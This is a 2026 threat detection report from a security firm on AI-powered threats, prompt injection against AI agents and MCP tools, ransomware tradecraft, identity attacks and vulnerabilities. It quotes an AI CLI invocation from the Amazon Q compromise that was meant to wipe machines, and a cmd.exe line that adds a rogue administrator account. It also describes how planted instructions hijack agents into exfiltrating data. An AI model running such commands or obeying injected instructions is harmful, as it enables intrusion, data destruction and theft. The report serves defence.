# Threat Detection Report

Organization: RedCanary  
Report Title: Threat-Detection-Report  
Year: 2026  

## Table of Contents
- [Introduction](#introduction)
- [Methodology](#methodology)
- [AI-powered threats](#ai-powered-threats)
- [Threats to AI infrastructure](#threats-to-ai-infrastructure)
- [Ransomware](#ransomware)
- [Identity attacks](#identity-attacks)
- [Vulnerabilities](#vulnerabilities)

---

## Introduction

We are pleased to present Red Canary’s 2026 Threat Detection Report. Our eighth annual retrospective is based on in-depth analysis of more than 110,000 threats detected across 4.5 million endpoints, networks, cloud infrastructure, identities, and SaaS applications over the past year. This report provides you with a comprehensive view of this threat landscape, including new twists on existing adversary techniques, and the trends that our team has observed as adversaries continue to organize, commoditize, and scale their cybercrime operations.

After reading this report, we encourage you to explore the Threat Detection Report website, featuring our new Threat Detection Library, an evergreen reference of threat and technique analysis that you can turn to whenever you run into malicious activity throughout the year.

As the technology that we rely on to conduct business continues to evolve, so do the threats that we face. Here are some of our key findings:

1. We continue to think that AI benefits defenders more than it benefits adversaries, but AI is lowering the barrier to develop and conduct cyber attacks. Like everyone else, adversaries leverage AI as a force multiplier, so it’s critical that defenders develop robust security controls that promote defense in depth and continually assess their coverage against known and emerging threats and techniques.
2. At the same time, as organizations rapidly adopt AI technologies, adversaries are seeking to compromise them. Security teams should protect these systems with robust identity controls and collect logs to actively monitor them. Likewise, organizations should carefully vet the AI tools they adopt and understand the potential supply chain risks associated with many common use cases for AI.

> **AI threats materialize in two ways:**
> 1. Adversaries using AI to develop threats
> 2. Adversaries attempting to compromise corporate AI systems

Cloud Accounts (T1078.004) continues to entrench itself as the top MITRE ATT&CK® technique in our dataset. This is in part because of the broadness of the technique (nearly all malicious activity in the cloud requires access to a valid cloud account). However, it’s also partly due to the fact that cloud accounts are a proxy for identity compromises (when organizations are using cloud-hosted identity providers).

It is important that security leaders invest in identity security controls and enforce the principle of least privilege to quell the risk from identity compromise and prevent adversaries from accessing cloud resources.

We detected 850 percent more identity threats in 2025 than we did in 2024. Identity threats accounted for 53 percent of overall detection volume in 2025, up from 20 percent in 2024.

This dramatic increase is due to many factors that include increased adoption of identity products, improved detection coverage for risky logins, better automation via agentic AI, and more. Identities are the most critical security boundary at most organizations, and adversaries are increasingly prioritizing identity compromise as a means to access cloud systems, SaaS apps, and corporate AI tools.

Browsers continue to be a critical focal point for adversaries and defenders alike. In the current world of identity providers and cloud-based applications, authentication commonly takes place in browsers, and browsers store highly sensitive residential materials like cookie-based tokens.

In addition to targeting information stored within browsers, adversaries commonly deliver payloads via browsers as well. Organizations must have optics into their browsers to detect these threats and should implement security controls—including user awareness training—to mitigate the risk posed by browser-borne threats.

RMM tools have become the payload of choice for a wide variety of differently motivated adversaries, and are often the payload that follow paste-and-run campaigns.

Detecting and preventing illicit use of these tools is tricky because administrators commonly use them to manage corporate systems. However, security teams should implement application controls to prevent use of unsanctioned RMM tools and closely monitor who is using permitted RMM tools and how.

### USE THIS REPORT TO:
- Explore the most prevalent and impactful threats, techniques, and trends that we’ve observed.
- Note how adversaries are evolving their tradecraft as organizations continue their shift to cloud-based identity, infrastructure, and applications.
- Learn how to emulate, mitigate, and detect specific threats and techniques.
- Shape and inform your readiness, detection, and response to critical threats.

---

## Methodology

### Behind the data
The Threat Detection Report sets itself apart from other annual reports with its unique data and insights derived from a combination of expansive detection coverage, diverse technological partnerships, and expert-led investigation and confirmation of threats. The data that powers Red Canary and this report are not mere software signals—this data set is the result of hundreds of thousands of investigations across millions of protected systems and identities.

Each of the more than 110,000 threats that we responded to have one thing in common: They weren’t prevented by our customers’ expansive security controls. This research is the result of a breadth and depth of analytics and analysis that we use to detect the threats that would otherwise go undetected.

### BY THE NUMBERS
Red Canary ingested 305 petabytes of security telemetry from 1,700 organizations’ endpoints, identities, cloud systems, and SaaS applications in 2025. We processed 329 billion records per day. Our detection engine generated 419 million investigative leads that our platform pared down to 8.5 million potentially malicious events. In the end, we detected 110,000 confirmed threats, 34,000 of which were higher-severity threats that might’ve represented a significant risk to our customers if we hadn’t detected them.

Every one of these was scrutinized by detection engineers, intelligence analysts, researchers, threat hunters, and an ever-expanding suite of bespoke agentic AI tools.

The Threat Detection Report synthesizes the critical information we communicate to customers whenever we detect a threat, the research and detection engineering that underlies those detections, the intelligence we glean from analyzing them, and the expertise we deploy to help our customers respond to and mitigate the threats we detect.

### What counts

#### Techniques
We map our custom detection analytics and the other security signals we use to detect threats to corresponding MITRE ATT&CK® techniques whenever possible. If the analytic or alert uncovers a realized or confirmed threat, we construct a timeline that includes detailed information about the activity we observed.

Because we know which ATT&CK techniques an analytic aims to detect, and we know which analytics led us to identify a realized threat, we are able to look at this data over time and determine technique prevalence, correlation, and much more.

#### Forever techniques
What we’ve learned over time is that a relatively small number of techniques play a role in a disproportionately large number of detections. It’s rare to see unexpected techniques in our top 10 or even 20 or 30, and when we do, it’s almost always because we’ve turned our focus to a new technological domain.

For example, we’ve seen an increase in adversary abuse of cloud, identity, and SaaS-related techniques in recent years as we’ve invested in securing those technologies.

To that point, over the last five years, we’ve detected at least one of the 10 most prevalent techniques in 46 percent of all detections. Over the same time period, we detected at least one of the top 20 techniques in 63 percent of detections.

> [Explore the Threat Detection Report website for an interactive view of the top techniques we’ve detected over the last five years.](https://threatdetectionreport.redcanary.com)

#### Threats
This report also examines the threats that leverage these techniques and other tradecraft intending to harm organizations. While Red Canary broadly defines a threat as any suspicious or malicious activity that represents a risk to you or your organization, we also track specific threats by associating malicious and suspicious actions with clusters of activity, specific malware variants, legitimate tools being abused, and known threat actors.

We track and analyze these threats continually throughout the year, publishing Intelligence Insights, bulletins, and profiles, considering not just prevalence of a given threat, but also aspects such as velocity, impact, or the relative difficulty of mitigation or defense. The Threats section of this report highlights our analysis of common or impactful threats, which we rank by the number of customers they affect.

#### Trends
Since this report is a macroanalysis of detection data from organizations of every size and from every sector, it’s rightfully biased toward threats and techniques that most organizations are likely to face. And we believe most organizations should prioritize those threats and techniques first and foremost. However, organizations are exposed to a great deal of risk from threats that may not be prevalent enough across enough organizations to rank among our top threats and techniques. As such, we also include extensive analysis of security trends from the year that we think security teams ought to be prepared for.

### What doesn’t count

#### Limitations
Red Canary optimizes for detecting and responding rapidly to early-stage adversary activity. As a result, the techniques that rank skew heavily between the initial access stage of an intrusion and any rapid execution, privilege escalation, lateral movement, and defense evasion. This will be in contrast to incident response providers, for example, whose visibility tends towards the middle and later stages of an intrusion, or a full-on breach.

> We often detect and action threats early, shielding organizations from the wide array of risks associated with breaches and incidents. As such, one of the great benefits of this report is that it acts as a playbook that organizations can follow to develop the ability to detect threats early and often, before adversaries are able to accomplish their objectives and cause harm.

Knowing the limitations of any methodology is important as you determine what threats your team should focus on. While we hope our list of top threats and detection opportunities helps you and your team prioritize, we recommend building your own threat model by comparing the top threats we share in our report with what other teams publish and what you observe in your own environment.

---

## AI-powered threats

Adversaries are leveraging AI services, command-lines tools and MCP servers to automate reconnaissance, credential theft, and data exfiltration.

AI-powered threats represent an evolution in tooling, not a revolution in attack techniques. Adversaries are leveraging AI in two major ways that align with how the industry overall is attempting to integrate AI:

1. **Force multiplier**: Adversaries are using AI in existing development workflows for planning, creating, and distributing malware and facilitating attacks.
2. **Automation**: Adversaries are attempting to automate workflows to leverage AI for attack techniques.

Command-line interface (CLI) tools, Model Context Protocol (MCP) servers, and large language models (LLMs) in general are attractive to adversaries because they offer the same advantages they provide to legitimate users: automation, flexibility, and broad access to systems and data.

Research from Google’s Threat Intelligence Group (GTIG) analyzing government-backed threat actor use of Gemini found that Iranian, Chinese, North Korean, and Russian APT groups are using AI to support reconnaissance, vulnerability research, payload development, and post-compromise activities. In September 2025, Anthropic detected and disrupted what they assessed as the first largely AI-orchestrated cyber espionage campaign, where a Chinese state-sponsored group used Claude Code to execute approximately 80-90 percent of tactical operations autonomously, with human operators serving primarily in strategic supervisory roles.

Beyond leveraging AI for coding, adversaries are also heavily relying on AI to execute fraud, not only through business email compromises and spear phishing but also to mimic individuals on phone or video conversations. For consumers, deepfake technologies are becoming rapidly harder to spot. Deepfakes may be used to directly fraud financial officers in companies to deliver fake invoices to adversaries or even to trick IT administrators into giving adversaries access to the environment.

AI-powered threats don’t require revolutionary new security approaches. The same principles that protect against “traditional” tradecraft also work with AI—least privilege, comprehensive monitoring, and defense in depth. Defending against threats that use AI, in other words, isn’t hopeless. It’s about getting the fundamentals right. However, the brief history of information security has proven that getting the fundamentals right is expensive and complicated.

### AI tradecraft in 2025

Throughout 2025, adversaries integrated AI into their operational workflows, using tools like Gemini, ChatGPT, and Claude to augment capabilities across the full attack lifecycle. This was made evident in a report from Google’s Threat Intelligence Group (GTIG), which analyzed prompts from adversaries who attempted to use Gemini, revealing consistent patterns of AI adoption for productivity gains rather than developing entirely novel capabilities. Below is a quick summary of activity covered in the GTIG report.

| Nation-state actor | Primary use cases |
| :--- | :--- |
| **Iran** | Heaviest users among government-backed groups. Phishing campaign development, reconnaissance, vulnerability research, translation, and localization. |
| **China** | Reconnaissance, scripting and development, research on ways to attain further access to target environments. |
| **North Korea** | Attack lifecycle research such as potential hosting infrastructure, reconnaissance on targets, payload development. A notable example was to draft cover letters and resumes to support clandestine IT worker fraud. |
| **Russia** | Notably limited engagement with Gemini, some basic coding tasks and localization work. |

Anthropic detected and disrupted what they assessed as the first AI-orchestrated cyber espionage campaign at scale. A Chinese state-sponsored group, designated GTG-1002, developed an autonomous attack framework using Claude Code and MCP tools to conduct operations without direct human involvement in execution. The framework broke down complex multi-stage attacks into discrete technical tasks—vulnerability scanning, credential validation, data extraction, lateral movement—that Claude executed based on carefully crafted prompts from human operators.

These developments demonstrate how AI provides adversaries with speed, scale, and automation rather than fundamentally new capabilities. For skilled actors, AI tools offer a helpful framework, similar to how Metasploit or Cobalt Strike streamlines operations. For less skilled actors, AI provides a learning and productivity tool enabling faster development and incorporation of existing techniques, effectively lowering the barrier of entry for adversaries to conduct different types of attacks.

### What does this mean for defenders?

From a detection standpoint, there will be minimal changes to how threats present themselves. Adversaries will continue to use the same techniques—AI simply lowers the barrier of entry for adversaries and allows them to operate faster.

To that point, a defender’s ability to differentiate AI-powered threats from threats that don’t leverage AI is limited. Red Canary has seen phishing campaigns that seem to be luring victims into LLMs, and we’ve almost certainly detected numerous threats that leveraged AI at some point in their development.

Ultimately, detecting these threats is business as usual, and we don’t see that changing any time soon.

JustAskJacky, the second most prevalent threat Red Canary detected in 2025, is a functioning AI chatbot that answers users’ questions but executes encoded commands in the background.

Further, we’ve conducted proof-of-concept research positing various ways that adversaries might leverage AI in the future, including by abusing “agent mode” features to trick users into granting credential and account access to malicious AI agents. While we anticipate this will become more of a problem as users become increasingly conditioned to granting account access to AI tools, we don’t think this is fundamentally different from traditional phishing.

### Take action

While the use of AI within your organization is not inherently malicious, it does introduce new risks as users become more comfortable delegating their access and responsibilities to AI agents. As innovative agentic AI tools emerge, they increasingly rely on users’ permissions to perform tasks, making these tools targets for exploitation. Solutions like OpenAI’s Atlas browser and ChatGPT’s “agent mode” exemplify how autonomous AI agents can introduce new, unmanaged vectors for prompt injection and data exfiltration. As adoption of these technologies grows, organizations must proactively assess and secure the ways AI agents interact with sensitive data and systems.

Protecting environments from AI-powered threats relies upon the same fundamentals as any existing threat. The only difference is that defenders should be relying on automation, AI or otherwise, in their environments to match the speed at which the adversaries are operating. AI-powered threats simply increase the speed and adaptability of adversaries.

---

## Threats to AI infrastructure

Adversaries target AI infrastructure through model manipulation and agent hijacking, exploiting the deep interconnectivity of AI tools to steal data and execute unauthorized commands.

The proliferation of AI infrastructure has created a highly interconnected attack surface that adversaries are actively exploiting. Organizations are deploying AI systems that result in deep integration within development environments, cloud resources, and data stores through Model Context Protocol (MCP) servers and AI command-line interfaces (CLI).

Organizations deploying AI infrastructure must understand that they’re not simply adding another application to their environment—they’re introducing autonomous agents capable of executing code, accessing data, and making decisions based on instructions that may originate from untrusted sources. Each of these integrations and configuration choices represents a potential vector for adversaries to exploit, yet many organizations lack visibility into how their AI infrastructure is configured, what data it can access, and what actions it can perform.

### Model behavior

When adversaries compromise these systems through model manipulation, the blast radius extends far beyond the AI platform itself to encompass any resource the agent can access. A single malicious GitHub issue could trigger an AI agent to exfiltrate private repository data, salary information, and confidential projects. Npm supply chain attacks also target AI CLI tools to discover crypto assets or to harvest credentials, as seen in the s1ngularity attack.

AI infrastructure presents unique challenges rooted in how these systems operate. AI agents combine the flexibility and decision-making capability of human users with the speed and scale of automation, making decisions based on natural language instructions that can be difficult to validate.

A compromised or hijacked AI agent can conduct reconnaissance on an entire environment, exfiltrate credentials, and pivot to additional resources in minutes rather than hours or days. The non-deterministic nature of these systems means the same malicious prompt can trigger different execution paths depending on what tools and resources are available, making detection difficult.

Model hijacking is becoming a more common initial access vector. By crafting malicious prompts that AI agents encounter during normal operations—reading GitHub issues, processing documentation, or analyzing code—adversaries can trick these agents into executing unauthorized commands, exfiltrating sensitive data, or providing access to connected systems.

What makes this particularly dangerous is that the attack requires very little effort. An attacker simply places carefully worded natural language instructions where an AI agent will read them, exploiting the fundamental trust relationship between AI systems and the content they process.

### Threats to AI infrastructure in 2025

The primary threat to AI infrastructure in 2025 centered on exploiting the architecture of modern AI systems: their deep integration with development tools, cloud resources, and external data sources. Adversaries recognize that AI agents, particularly those enhanced with MCP servers and AI CLI tools, represent attractive targets for manipulation because they operate with elevated privileges and broad system access while making decisions based on natural language input that can be difficult to validate.

> Prompt injection emerged as a dominant attack vector, allowing adversaries to hijack AI agents by strategically placing malicious prompts in locations that AI agents access during normal operations such as public GitHub repositories, documentation sites, API responses, or even file contents within compromised systems. When an AI agent processes this content, it may interpret the malicious prompt as a legitimate instruction, particularly if the agent lacks robust input validation or clear boundaries between trusted and untrusted content.

Adversaries typically attempt to run non-interactive sessions with AI CLI tools to facilitate these prompt injection attacks. One example is the Amazon Q VSCode extension compromise, where an adversary attempted to wipe every machine that had it installed though the command:
```
q --trust-all-tools --no-interactive "${re}"
```
Luckily, it seemed the adversary simply forgot to add in the chat command, which prevented execution.

This is a very active and growing domain for threats. As businesses continue to implement new AI tooling and infrastructure, adversaries will continue to adapt their techniques. Overall, adversaries continue to target credentials wherever they exist and as AI tools are granted more access, they will continue to contribute to the increasing nest of credentials.

### Take action

The foundation of AI infrastructure security rests on the same principles that protect any system: least privilege, defense in depth, and comprehensive monitoring. However, the application of these principles must account for the specific ways AI systems operate and the threats they face. Further, the magnitude of the threat posed by an adversary compromising an organization’s AI systems—along with the speed with which an adversary can act and the volume of information they can potentially access in these systems—represents a significant risk to enterprises.

To secure the models themselves, security teams should centralize model access for all teams. Tools like LiteLLM provide a central repository for API key creation and model hosting. With centralized access, it is possible to provide robust prompt monitoring and holistic detection of the use of LLMs in an environment.

#### Lock down credentials
The primary defense against service hijacking is credential management. API keys for AI platforms should be treated with the same rigor as any high-value credential:
- Implement short-term, scoped credentials rather than long-lived API keys that adversaries can harvest and reuse indefinitely.
- Use secrets management solutions like AWS Secrets Manager or Azure Key Vault rather than hardcoding credentials in configuration files or source code.
- Deploy automated credential scanning tools that can detect API keys in repositories, log files, or container images before adversaries discover them.

When credential exposure does occur—and it inevitably will—implement rapid rotation procedures to invalidate compromised credentials before they can be abused.

#### Secure the supply chain
The rapid adoption of MCP servers and AI CLI tools has outpaced the development of security practices for vetting and deploying these components. Organizations should maintain an internal registry of vetted MCP servers rather than allowing developers to install arbitrary code from public repositories. Before deploying any MCP server, audit its code to understand:
- the actions it can perform
- the data it can access
- the external connections it makes

Favoring well-known projects with clear ownership and active maintenance reduces supply chain risk. Projects maintained by established organizations or with transparent security practices are less likely to contain malicious code than abandoned or newly created repositories with minimal visibility. MCP servers and tools should be viewed similarly as any third-party SaaS solution that is introduced into an environment.

#### Implement defense in depth
Layering security controls limits the blast radius when a single control fails.

##### OAuth-based authentication
The most critical control for MCP integrations is replacing broad access tokens with scoped credentials. The GitHub MCP attack described above succeeded because a single token granted AI agents access to all repositories—public and private. OAuth-based authentication with repository-specific scopes helps prevent this privilege escalation.

##### Container isolation
Container isolation provides additional defensive layers for MCP servers. Deploy MCP servers in sandboxed environments with restricted filesystem access, limited network egress, and resource constraints. While containerization won’t prevent an AI agent from using legitimate tools inappropriately when prompt-injected, it limits what malicious MCP servers can do if introduced into your environment through a supply chain compromise.

Verify container signatures to prevent execution of tampered MCP server images, and implement network policies that restrict which external services containerized MCP servers can reach.

##### Segmentation
Use segmentation to prevent cross-contamination between public and private resources. AI agents that interact with public data sources—scraping websites or processing external APIs—should operate with different credentials and permissions than agents that access sensitive internal data. This segmentation ensures that if an agent encounters malicious content designed for prompt injection in public spaces, the resulting compromise affects only systems with limited access rather than your entire infrastructure.

The GitHub MCP attack demonstrated the danger of unified credentials: the same token that allowed reading public issues also unlocked private repositories containing salary data and confidential projects.

#### Establish governance and training
Technology controls alone are insufficient if developers don’t understand the security implications of their AI tool usage:
- Create organizational policies that define which AI tools and MCP servers are approved for use, such as requiring security review for custom MCP server development.
- Document what data and resources AI agents should access.
- Train developers on secure practices for AI tool usage, including how to recognize and report suspicious AI behavior, the importance of input validation when processing external content, and the risks of granting AI agents access to high-privilege credentials.

---

## Ransomware

In 2025, ransomware operations adopted aggressive social engineering techniques and moved to exfiltration-only extortion schemes.

Ransomware is holding strong as a lucrative business model for criminals. 2025 continued to see an increasing number of compromises, with some criminal groups switching to a data-extortion-without-encryption model. However, the percent of victims paying the ransom—regardless of whether encryption is involved in the extortion—continues to decrease year over year. This has resulted in lower total revenue for ransomware operators, marking a win for the good guys.

As with previous years, Red Canary’s visibility into the ransomware landscape focused on the early stages of the ransomware intrusion chain—the initial access, reconnaissance, lateral movement, privilege escalation, and command and control (C2) occurring before exfiltration or encryption. Focusing on detecting intrusions in their earliest stages continued to be a solid approach to stopping ransomware in 2025, so we’ll focus on sharing what has worked for us.

We observed very few intrusions make it to the final stages of data exfiltration or encryption. However, Akira made it into our monthly top 10 threat list for October, marking the first time we’ve seen a ransomware group in the list since November 2021. In addition to Akira, in 2025 we observed data exfiltration or encryption activity related to the following ransomware variants:
- Qilin
- Play
- Inc

We also observed precursor activity that we assess would have led to the following variants:
- Black Basta
- Ransomhub
- Lockbit

### Common ransomware precursors in 2025
As in previous years, multiple threats in our top 10 have reportedly preceded ransomware encryptor deployment or other extortion activities. Check out each of these pages for ideas on how to take action to detect those threats:
- SocGholish
- CleanUpLoader
- KongTuke
- NetSupport Manager

We’ve previously shared the simplified ransomware intrusion chain below as a way to think about detecting across the entire intrusion, and this chain continued to hold up as a high-level approach to breaking down ransomware.

### Ransomware intrusion chain
Here are some of the common techniques, tools, and procedures we observe across “pre-ransomware” intrusion stages.

#### Initial access
Ransomware affiliates continue to use the same cast of characters for initial access, including phishing, valid credentials, and vulnerability exploitation. This year also continued a trend of ransomware affiliates utilizing aggressive social engineering techniques, like targeting the help desk through voice phishing.

Since at least August 2025, adversaries deploying Akira ransomware reportedly obtained initial access via misconfigured SonicWall VPNs or by exploiting SonicWall VPNs vulnerable to CVE-2024-40766. This SonicWall VPN vulnerability allows for unauthorized access to SonicWall VPN devices under certain conditions and was originally disclosed in August 2024 with an available patch released a day after disclosure. Nearly a year after the patch, Akira affiliates conducted a campaign targeting the same vulnerability or misconfiguration stemming from a failure to reset local account passwords with the update.

In observed Play, Qilin, and Akira intrusions, the affiliate adversaries exploited known Veeam vulnerabilities for initial access and privilege escalation: CVE-2023-27532, which targets the Veeam Backup & Replication component to obtain initial access, and CVE-2024-40711, a critical vulnerability that allows for remote code execution and privilege escalation.

In the observed instances exploiting CVE-2024-40711, the adversary added a user named “admon” [sic] to the administrator group by using `Veeam.Backup.MountService.exe` to spawn the process `cmd.exe`, with the following command line:
```
"C:\Windows\System32\cmd.exe" /c cmd.exe /c net localgroup Administrators Admon /add:
```

The consistent exploitation of vulnerabilities years after their initial disclosure underscores the need to expediently patch and update devices, particularly edge devices that can allow initial access. Read more in the Vulnerabilities trend section of this report.

We also observed multiple email bombing campaigns, which continues the trend observed in 2024 of ransomware affiliates utilizing direct engagement to social engineer their targets. The email bombing campaigns followed the same pattern as observed in 2024, beginning with flooding a victim’s inbox with spam. Next, the adversary—posing as an IT admin offering to help with the email problem—contacted the user via phone or a link to join a Microsoft Teams call. Once in contact, the adversary guided the user into running a remote monitoring and management (RMM) tool like Microsoft Quick Assist.

We also observed ransomware affiliates use SEO poisoning to trick users into downloading trojanized installers of administrative tools like DBeaver and OpManager to obtain initial access. Upon execution, the malicious binary would drop the legitimate administrative tool as well as the malicious component. The malicious downloads eventually led to the deployment of additional malware, including ransomware encryptors.

Finally, as noted in the Stealers section, we continued to see increasing use of info-stealing malware, which adversaries use to sell valid credentials to ransomware affiliates to gain access.

#### Discovery
As adversaries land on new systems, we regularly observe them conducting discovery with a combination of tools and the usual built-in commands:
- `ipconfig`
- `whoami`
- `net`
- `nltest`

This past year, we also observed ransomware affiliates using SoftPerfect Network Scanner to obtain information about network devices, Advanced Port Scanner to identify open ports, and SharpShares to enumerate accessible network shares. Adversaries also utilized BloodHound to obtain information about the Active Directory environment.

#### Privilege escalation and lateral movement
Ransomware affiliates quickly move laterally after gaining initial access, often attempting to move to unmonitored parts of the network. In fact, some intrusions progress from initial access to encryption in a matter of hours. In 2025, adversaries used what works, and what works is to use tools inherent to the system. To this end, adversaries used `PsExec` and `net.exe` to move to adjacent hosts or escalate privileges.

#### Defense evasion
As antivirus and endpoint detection have become really good at detecting execution of malware, adversaries have been forced to double down on defense evasion methods to remain undetected through the entire intrusion chain. As mentioned, one method is to quickly pivot to unmonitored devices. Other methods include utilizing EDR killers or attempting to turn off features in security products.

Ransomware affiliates also drop and execute malware from standard Windows system folders, like the world-writable `PerfLogs` directory, likely in an attempt to bypass traditional security detection tools by utilizing trusted folders that do not need elevated permissions to write to.

#### Command and control
This past year, we saw adversaries continue to abuse RMM tools. Adversaries use these tools to facilitate lateral movement, persistence, and command and control; we classify RMM usage under command and control, consistent with MITRE ATT&CK. RMM tools are an attractive option for adversaries because they offer robust sets of remote administration features with the veneer of legitimacy, as they are used for regular business functions.

This past year, we observed the following RMM tools deployed prior to ransomware encryptors:
- AnyDesk
- QuickAssist
- SimpleHelp

### Notable ransomware trends in 2025

2025 saw about 33 percent more ransomware victims than 2023 and 2024, according to ransomware leak site scrapers, continuing the year-over-year trend of increasing intrusions. Similarly, there is a near identical percentage increase in the number of active ransomware groups, according to the same ransomware leak site trackers.

Despite this, ransomware negotiators continue to report a decreasing percentage of victims that choose to pay the ransom. This trend of fewer victims paying is likely due to increased adoption of immutable backups and improved business recovery plans that mean many victims do not need the encryptor to recover from a ransomware intrusion.

Further, law enforcement takedowns have proven that ransomware operators do not delete data as promised, meaning that the word of ransomware operators in data leak extortion operations cannot be trusted.

Despite this, the ransomware ecosystem is still largely profitable. This is likely due to adversaries trending towards quantity of intrusions over high ransom payment demands—or big game hunting. Even with a lower percent of victims paying, the ransomware operators are able to achieve results by simply playing the numbers game. Further, ransomware operators can opt for easier targets and noisier intrusions, cutting bait when the victim identifies the intrusion early, as they know another victim is already in the pipeline.

#### Increase in exfiltration to extortion without encryption
After years reporting about trends towards double and triple extortion from ransomware affiliates, we have come full circle to ransomware groups that are engaging in extortion without any encryption. In these cases, the adversary will steal data and use threats of releasing the stolen information for leverage to extort victims. Intrusions that rely solely on data theft are less technically challenging, and can rely on living-off-the-land techniques and tools inherent to the operating system. Therefore, data theft can be accomplished more quickly and more stealthily than moving laterally and dropping encryptor malware. Threat groups that have adopted the extortion without encryption technique include Lapsus$, Cl0p, Hunters, and BianLian.

#### Ransomware affiliates directly engaging targets
A notable trend from 2024 was an increase in aggressive social engineering tactics like voice phishing, and this trend has been adopted by even more ransomware operators in 2025. Adversaries are phishing the help desk and impersonating SaaS administrators in order to get users at the target organization to give them unfettered access.

In the intrusions we observed, the adversaries followed the email bombing playbook discussed above, with QuickAssist typically being the resulting RMM of choice. One of the most brazen social engineering tactics observed this year was Medusa ransomware adversaries offering a cut of the ransom profits to an employee in exchange for insider access, as reported by BBC. This trend may indicate that adversaries are having less success with traditional phishing techniques and have pivoted to engaging employees directly.

### Take action

#### Prevention
An effective prevention strategy is increasing defender visibility across your network.

Ransomware affiliates are adept at quickly pivoting to unmonitored parts of the network, and any endpoints without security monitoring can create an attacker playground. Enhancing endpoint visibility by deploying detection and response sensors across systems limits adversaries’ freedom.

In addition to reducing the number of unmonitored endpoints, consider these additional preventive measures:
- Educate employees on the latest ransomware TTPs, such as the email bombing techniques employed by multiple ransomware affiliates.
- Prioritize patching internet-facing vulnerabilities, ransomware affiliates will often exploit vulnerabilities years after their disclosure.
- Maintain an approved tools list and monitor or deny unauthorized RMM tools. Legitimate tools can be exploited—know what’s in your environment and how the tools are utilized. Adversaries will often change the filename, download and run it from a non-standard directory, or make suspicious network connections.

---

## Identity attacks

Identity-based threats now account for more than half of our total confirmed threats, following an 850 percent increase in identity threat detections year over year.

Despite continued advancements in authentication controls, including centralized identity and access management (IAM) providers and the widespread adoption of multi-factor authentication (MFA), identity attacks continued to dominate the threat landscape in 2025.

As identity has expanded to replace traditional network boundaries in the shift to cloud-based environments, adversaries have recognized that compromising valid user accounts is significantly more effective than exploiting technical vulnerabilities.

This evolution reflects a continuing change in enterprise architecture in which organizations are increasingly distributing resources across numerous platforms, devices, SaaS applications, and hybrid workforces. With the success of past attacks and the continued adoption of identity federation, this trend is likely to continue into 2026 and beyond.

Identity threats increased by 850 percent from 2024, accounting for 53 percent of overall detection volume in 2025.

### Identity attacks in 2025

It was a busy year for identity attacks, and Red Canary saw it all: From the proliferation of device code phishing, to sophisticated adversary-in-the-middle (AitM) attacks, to tried-and-true social engineering techniques. Credential harvesting was a major theme as well, with multiple high-profile attacks leveraging common security tools to discover and exploit valid credentials.

> “Adversaries have realized that compromising valid accounts is significantly more effective than exploiting technical vulnerabilities.”

### Methods and madness

While not an exhaustive list, we routinely observe adversaries attempting the following techniques to compromise identities.

#### Infostealers
Infostealers have evolved into a sophisticated credential harvesting ecosystem, with malware-as-a-service (MaaS) families like Atomic Stealer, Odyssey Stealer, and Rhadamanthys systematically exfiltrating passwords, session tokens, access keys, and other credentials that can provide access without triggering additional authentication requirements. Competition in the commoditization of infostealer malware is likely to continue in 2026.

#### Brute force
Password-spraying attacks work by testing common or easily guessed passwords against many accounts simultaneously, deliberately staying below account lockout thresholds to avoid detection while maximizing the chance of finding weak credentials.

Credential-stuffing attacks exploit widespread password reuse by automatically testing username and password combinations stolen from previous data breaches.

Adversaries are increasingly combining password spraying and credential-stuffing techniques, leveraging massive databases of breached credentials from infostealers and data leaks to inform their target and password lists, making these attacks more effective against organizations with weak password policies and relaxed MFA requirements.

#### Device code phishing
We predicted back in 2022 that device code phishing would likely have a real impact in the future and 2025 was a banner year. Device code phishing abuses the legitimate OAuth device authorization grant flow, which is intended for devices with limited input capabilities, such as televisions.

Adversaries register their own third-party applications, request device codes tied to those applications, and trick victims into entering the codes on legitimate login pages to grant access to the malicious application.

#### Consent phishing
Consent phishing also takes advantage of OAuth authorization flows by presenting victims with consent requests for applications that have been registered with legitimate providers, such as Microsoft Entra ID, but that are controlled by adversaries. These third-party applications typically masquerade as trusted services by using similar naming conventions and validated domains that closely resemble legitimate publishers.

#### (In)direct credential exposure
Adversaries are increasingly using legitimate security tools to discover and validate credentials from victim environments. This not only includes endpoints, but communication platforms, knowledge bases, and source code repositories.

Distributed, cloud-based workloads have made authenticating to numerous public-facing services the norm, and adversaries routinely find plaintext secrets in environment variables, CI/CD pipeline, and container definition files, using them to pivot to other services and platforms. These non-human identities are commonly excluded from MFA requirements and are oftentimes not subject to additional contextual controls.

Recent major attacks involving credential harvesting include Sha1-Hulud: The Second Coming and the September 2025 breach of Red Hat Consulting.

#### MFA bypass

##### Token theft
Token theft remains a favored attack method for adversaries due to the continued proliferation of browser exploits and commoditization of infostealer malware. Once obtained, stolen tokens allow adversaries post-MFA access to all of the resources the victim is authenticated to until the session either expires or is revoked. Learn more on the Steal Application Access Token technique page.

##### Adversary-in-the-middle (AitM)
Adversary-in-the-middle (AitM) phishing kits, a component of the broader phishing-as-a-service ecosystem, allow adversaries to deploy a reverse proxy between victims and legitimate authentication services. As victims interact with spoofed versions of login pages, requests and responses flow through these proxies, where adversaries can collect authenticated session tokens that are returned from the legitimate service.

##### MFA fatigue
Also referred to as “push bombing” or “flooding,” MFA fatigue attacks involve an adversary with legitimate credentials rapidly triggering MFA push notification requests to frustrate the user into accepting the request and granting access.

---

## Vulnerabilities

In 2025, Red Canary tracked vulnerabilities in software including SAP NetWeaver, Microsoft Windows Server Update Services, and SharePoint.

Adversaries continue to leverage system, software, and firmware vulnerabilities to gain initial access. Left unaddressed, these weaknesses can endanger critical assets, leading to consequences like data breaches, financial losses, regulatory penalties, and lasting reputational damage.

### Vulnerabilities in 2025

In addition to the usual CVEs in virtual private networks (VPNs) and firewall devices, bugs in large language models (LLMs) and critical severity vulnerabilities in JavaScript packages made headlines this past year, enabling adversaries to achieve remote code execution as well as escalate privileges and move laterally through environments, both on premise and in the cloud.

2025 saw a total of 48,172 vulnerabilities published to the National Vulnerability Database’s (NVD) list of Common Vulnerabilities and Exposures (CVE), more than a 20 percent increase from 2024.

Often, it’s not just the latest vulnerabilities making news. In July 2025, Akira ransomware compromises surged, stemming from unpatched SonicWall SSL VPN vulnerabilities, including CVE-2024-40766, which had been patched a year prior.

According to a February 2025 report, the LockBit group exploited a 10.0 CVSS vulnerability in Atlassian Confluence from two years prior (CVE-2023-22527) to spread ransomware.

Red Canary called our customers’ attention to several specific vulnerabilities in 2025:

#### CVE-2025-31324
This vulnerability, a missing authorization check in SAP NetWeaver, allows for unrestricted file uploads into a NetWeaver server, meaning an adversary could upload web shells and other arbitrary content to execute on the SAP NetWeaver server.

